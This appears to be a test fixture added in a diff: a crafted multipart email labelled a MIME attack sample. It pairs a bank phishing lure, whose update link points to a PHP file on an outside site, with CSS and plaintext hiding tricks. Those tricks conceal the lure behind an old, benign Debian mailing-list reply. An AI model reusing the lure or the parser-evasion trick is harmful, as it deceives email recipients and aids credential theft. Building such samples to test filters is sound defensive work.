@@ -1,0 +1,97 @@
+From: DavidDutch1964 <daviddutch1964@yahoo.com>
+To: theresa.staab@enron.com, barry.tycholiz@enron.com
+Subject: MIME Attack Sample
+Content-Type: multipart/mixed; boundary="DELIMITER"
+--DELIMITER
+Content-Type: text/html
+Content-Type: text/plain; charset="utf-8"
+Content-Transfer-Encoding: quoted-printable
+
+Dear Customer,
+
+Your services has been short listed for maintenance,=20
+please take a moment to review your account security services.
+
+
+Press Here To Update Now=20
+
+
+Yours Sincerely,
+Noor Islamic Bank (NIB).=20
+
+------=_NextPart_000_04EA_01CDF22D.A924BE20
+Content-Type: text/html; charset="utf-8"
+Content-Transfer-Encoding: quoted-printable
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
+<HTML><HEAD>
+<META http-equiv=3DContent-Type content=3D"text/html; charset=3Dutf-8">
+<META content=3D"MSHTML 6.00.6000.16674" name=3DGENERATOR></HEAD>
+<BODY>
+<P><FONT face=3DVerdana size=3D2>Dear Customer,<BR><BR>Your services has =
+been short=20
+listed for maintenance, <BR>please take a moment to review your account s=
+ecurity=20
+services.</FONT></P><BR>
+<P><FONT face=3DVerdana size=3D2><FONT color=3D#000080><A=20
+href=3D"http://www.ayodia.co.id/wp-content/plugins/noor.php" target=3D_bl=
+ank=20
+rel=3Dnofollow>Press Here To Update Now</A></FONT> <BR><BR><BR>Yours=20
+Sincerely,<BR>Noor Islamic Bank (NIB). </FONT></P></BODY></HTML>
+
+------=_NextPart_000_04EA_01CDF22D.A924BE20--
+<style>fieldset, br{display: none;}</style>
+<div style="display: none;"><plaintext>
+--DELIMITER
+Content-Type: multipart/signed; boundary="BOUNDARY"; protocol="application/pgp-signature"
+--BOUNDARY
+Content-Type: text/plain
+Content-Transfer-Encoding: quoted-printable
+ SHA1
+
+Oops, sorry, yes, you're right.
+
+Greg
+
+
+
+On Mon, Jun 18, 2007 at 09:02:17AM +0200, Jan Buchal wrote:
+> Small correction not Cid but sid. More on URL:
+> http://www.debian.org/releases/index.en.html
+> 
+> Best
+> 
+> 
+> -- 
+> 
+> Jan Buchal
+> Tel: (00420) 24 24 86 008
+> Mob: (00420) 608023021
+> 
+> 
+> _______________________________________________
+> Speakup mailing list
+> Speakup@braille.uwo.ca
+> http://speech.braille.uwo.ca/mailman/listinfo/speakup
+
+- -- 
+web site: http://www.romuald.net.eu.org
+gpg public key: http://www.romuald.net.eu.org/pubkey.asc
+skype: gregn1
+(authorization required, add me to your contacts list first)
+
+- --
+Free domains: http://www.eu.org/ or mail dns-manager@EU.org
+-BOUNDARY--
+Content-Type: application/pgp-signature; name="signature.asc"
+BEGIN PGP SIGNATURE-----
+Version: GnuPG v1.4.6 (GNU/Linux)
+
+iD8DBQFGdsNA7s9z/XlyUyARAmCVAKC0ttvcwB4xJ30/Y8SlGW3aWcOj0wCfXOXD
+4oi92WedQU8RTRbBiv6NxjY=
+=cuOR
+-----END PGP SIGNATURE-----
+
+____
+--BOUNDARY--
+--DELIMITER--
